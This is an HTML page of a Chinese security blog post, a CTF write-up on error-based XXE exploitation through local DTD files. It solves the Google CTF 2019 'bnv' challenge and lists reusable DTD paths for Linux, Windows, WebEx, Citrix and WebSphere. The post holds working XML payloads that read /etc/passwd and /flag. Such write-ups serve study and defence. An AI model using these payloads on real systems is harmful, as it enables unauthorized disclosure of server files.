@@ -1,0 +1,342 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,XML注入,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>从一道CTF题看如何通过本地DTD文件利用XXE实现回显 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        从一道CTF题看如何通过本地DTD文件利用XXE实现回显
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2019-06-27T14:14:57.000Z">
+        2019-06-27
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XML注入/">XML注入</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x01-利用本地DTD文件实现XXE攻击"><a href="#0x01-利用本地DTD文件实现XXE攻击" class="headerlink" title="0x01 利用本地DTD文件实现XXE攻击"></a>0x01 利用本地DTD文件实现XXE攻击</h2><p>一般来说，对于无回显的支持外部实体的XXE，是通过带外通道OOB实现攻击回传数据。</p>
+<p>但是，当你的服务器和目标服务器之间有防火墙时，上面的方法就没辙了。此时我们就可以通过本地DTD文件利用XXE漏洞实现任意结果的输出。</p>
+<h3 id="内部DTD文件可干啥？"><a href="#内部DTD文件可干啥？" class="headerlink" title="内部DTD文件可干啥？"></a>内部DTD文件可干啥？</h3><p>要想在内部DTD子集中使用外部DTD语法，你可以在目标主机上强制执行本地DTD文件，并在其中重新定义一些参数实体引用：</p>
+<p><strong>Request</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!ENTITY % condition &apos;aaa)&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">        &lt;!ELEMENT aa (bb&apos;&gt;</span><br><span class="line"></span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>sip-app_1_0.dtd 中的内容</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">…</span><br><span class="line">&lt;!ENTITY % condition &quot;and | or | not | equal | contains | exists | subdomain-of&quot;&gt;</span><br><span class="line">&lt;!ELEMENT pattern (%condition;)&gt;</span><br><span class="line">…</span><br></pre></td></tr></table></figure>
+<p>它起作用是因为所有XML实体都是常量，如果定义两个具有相同名称的实体则仅使用第一个实体。</p>
+<h3 id="内部DTD文件合集"><a href="#内部DTD文件合集" class="headerlink" title="内部DTD文件合集"></a>内部DTD文件合集</h3><p>通过枚举来查找文件和目录应该是最简单的方法了，以下是一些成功应用此技巧的例子：</p>
+<p><strong>Linux</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ISOamsa &apos;Your DTD code&apos;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
+<p><strong>Windows</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:\Windows\System32\wbem\xml\cim20.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % SuperClass &apos;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&apos;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
+<p>感谢来自Positive Technologies的@Mike_n1分享的这条始终存在的Windows DTD文件路径。</p>
+<p><strong>Cisco WebEx</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % url.attribute.set &apos;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&apos;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
+<p><strong>Citrix XenMobile Server</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % Body &apos;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&apos;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
+<p><strong>多平台 IBM WebSphere 应用</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;./../../properties/schemas/j2ee/XMLSchema.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xs-datatypes &apos;Your DTD code&apos;&gt;</span><br><span class="line">&lt;!ENTITY % simpleType &quot;a&quot;&gt;</span><br><span class="line">&lt;!ENTITY % restriction &quot;b&quot;&gt;</span><br><span class="line">&lt;!ENTITY % boolean &quot;(c)&quot;&gt;</span><br><span class="line">&lt;!ENTITY % URIref &quot;CDATA&quot;&gt;</span><br><span class="line">&lt;!ENTITY % XPathExpr &quot;CDATA&quot;&gt;</span><br><span class="line">&lt;!ENTITY % QName &quot;NMTOKEN&quot;&gt;</span><br><span class="line">&lt;!ENTITY % NCName &quot;NMTOKEN&quot;&gt;</span><br><span class="line">&lt;!ENTITY % nonNegativeInteger &quot;NMTOKEN&quot;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-Google-CTF-2019-bnv"><a href="#0x02-Google-CTF-2019-bnv" class="headerlink" title="0x02 Google CTF 2019 bnv"></a>0x02 Google CTF 2019 bnv</h2><p>题目地址：<a href="http://bnv.web.ctfcompetition.com/" target="_blank" rel="noopener">http://bnv.web.ctfcompetition.com/</a></p>
+<p>访问页面，有个选项框让你选择，然后返回该地址的一些信息：</p>
+<p><img src="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/1.png" alt=""></p>
+<p>查看源码，发现有个post.js：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AjaxFormPost</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> datasend;</span><br><span class="line">  <span class="keyword">var</span> message = <span class="built_in">document</span>.getElementById(<span class="string">'message'</span>).value;</span><br><span class="line">  message = message.toLowerCase();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> blindvalues = [</span><br><span class="line">    <span class="string">'10'</span>,    <span class="string">'120'</span>,   <span class="string">'140'</span>,    <span class="string">'1450'</span>,   <span class="string">'150'</span>,   <span class="string">'1240'</span>,  <span class="string">'12450'</span>,</span><br><span class="line">    <span class="string">'1250'</span>,  <span class="string">'240'</span>,   <span class="string">'2450'</span>,   <span class="string">'130'</span>,    <span class="string">'1230'</span>,  <span class="string">'1340'</span>,  <span class="string">'13450'</span>,</span><br><span class="line">    <span class="string">'1350'</span>,  <span class="string">'12340'</span>, <span class="string">'123450'</span>, <span class="string">'12350'</span>,  <span class="string">'2340'</span>,  <span class="string">'23450'</span>, <span class="string">'1360'</span>,</span><br><span class="line">    <span class="string">'12360'</span>, <span class="string">'24560'</span>, <span class="string">'13460'</span>,  <span class="string">'134560'</span>, <span class="string">'13560'</span>,</span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> blindmap = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">var</span> i;</span><br><span class="line">  <span class="keyword">var</span> message_new = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; blindvalues.length; i++) &#123;</span><br><span class="line">    blindmap[i + <span class="number">97</span>] = blindvalues[i];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; message.length; i++) &#123;</span><br><span class="line">    message_new += blindmap[(message[i].charCodeAt(<span class="number">0</span>))];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  datasend = <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">    <span class="string">'message'</span>: message_new,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">var</span> url = <span class="string">'/api/search'</span>;</span><br><span class="line">  xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhr.open(<span class="string">'POST'</span>, url, <span class="literal">true</span>);</span><br><span class="line">  xhr.setRequestHeader(<span class="string">'Content-type'</span>, <span class="string">'application/json'</span>);</span><br><span class="line"></span><br><span class="line">  xhr.onreadystatechange =</span><br><span class="line">      <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.status == <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(xhr.getResponseHeader(<span class="string">'Content-Type'</span>));</span><br><span class="line">        <span class="keyword">if</span> (xhr.getResponseHeader(<span class="string">'Content-Type'</span>) == <span class="string">"application/json; charset=utf-8"</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">var</span> json = <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line">                <span class="built_in">document</span>.getElementById(<span class="string">'database-data'</span>).value = json[<span class="string">'ValueSearch'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(e) &#123;;</span><br><span class="line">                <span class="built_in">document</span>.getElementById(<span class="string">'database-data'</span>).value = e.message;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">'database-data'</span>).value = xhr.responseText;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      xhr.send(datasend);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>主要功能就是将输入的内容转换成ASCII码，然后再到blindvalues的数组（数组大小为26）中寻找并替换，在此之前blindvalues的下标加了97，也就是说，我们输入的json的参数内容只能限定在26个字母中，这样就没法往下利用，点不在这。</p>
+<p>没啥其他提示，看下报文，都是Json格式：</p>
+<p><img src="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/2.png" alt=""></p>
+<p>根据参考文章提示，Content-Type为application/json并使用Json进行数据交互的Web站点，可以修改其Content-Type为application/xml，并尝试进行XXE注入。</p>
+<p>先修改Content-Type为application/xml，发现响应包返回没有找到开启的标签符\&lt;，也就是明确是是可以解析XML格式数据的：</p>
+<p><img src="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/3.png" alt=""></p>
+<p>修改Json格式数据为XML格式数据，提示找不到DTD：</p>
+<p><img src="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/4.png" alt=""></p>
+<p>下面直接用内部DTD文件实现回显利用，先发送WebSphere测试下：</p>
+<p><img src="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/5.png" alt=""></p>
+<p>报错，找不到该内部DTD文件，而目标系统是Linux，直接换Linux的payload就好：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ISOamsa &apos;</span><br><span class="line">	&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">	&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">	&amp;#x25;eval;</span><br><span class="line">	&amp;#x25;error;</span><br><span class="line">&apos;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">&lt;message&gt;any text&lt;/message&gt;</span><br></pre></td></tr></table></figure>
+<p>访问flag文件即可得到flag：</p>
+<p><img src="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/6.png" alt=""></p>
+<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" target="_blank" rel="noopener">Exploiting XXE with local DTD files</a></p>
+<p><a href="https://blog.netspi.com/playing-content-type-xxe-json-endpoints/" target="_blank" rel="noopener">Playing with Content-Type – XXE on JSON Endpoints</a></p>
+<p><a href="https://www.freebuf.com/articles/web/195899.html" target="_blank" rel="noopener">使用本地DTD文件来利用XXE漏洞实现任意结果输出</a></p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-利用本地DTD文件实现XXE攻击"><span class="toc-text">0x01 利用本地DTD文件实现XXE攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#内部DTD文件可干啥？"><span class="toc-text">内部DTD文件可干啥？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内部DTD文件合集"><span class="toc-text">内部DTD文件合集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Google-CTF-2019-bnv"><span class="toc-text">0x02 Google CTF 2019 bnv</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-参考"><span class="toc-text">0x03 参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2019/06/25/浅析DOM型XSS/" rel="next" title="浅析DOM型XSS">
+          浅析DOM型XSS
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/" rel="prev" title="一道Bypass正则过滤的反序列化漏洞题目">
+            一道Bypass正则过滤的反序列化漏洞题目
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
